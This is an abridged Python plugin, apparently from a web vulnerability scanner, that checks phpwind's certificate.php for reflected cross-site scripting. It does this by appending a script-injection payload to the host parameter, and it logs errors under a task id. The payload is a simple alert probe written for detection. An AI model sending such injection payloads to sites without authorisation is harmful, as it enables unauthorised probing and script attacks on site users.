...
def run_domain(http,ob):
    ...
    try:
        ...
        url+="certificate.php?host='\"><script>alert(111)</script><\""
        ...
        logging.getLogger().error("File:phpwind_certificate.phpXSS.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpwind_certificate.phpXSS.py, run_domain function :" + str(e))
    #end try
